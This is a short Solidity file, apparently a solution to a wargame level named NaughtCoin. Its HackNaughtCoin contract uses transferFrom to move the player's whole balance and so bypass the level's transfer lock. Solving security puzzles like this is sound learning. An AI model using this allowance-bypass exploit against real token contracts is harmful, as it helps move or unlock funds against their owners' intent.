pragma solidity ^0.5;

contract NaughtCoin {
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool);
  function balanceOf(address account) external view returns (uint256);
}

contract HackNaughtCoin {
  function hack (address _victim) public {
      // msg.sender == player
      NaughtCoin(_victim).transferFrom(msg.sender, address(this),  NaughtCoin(_victim).balanceOf(msg.sender));
  }
}
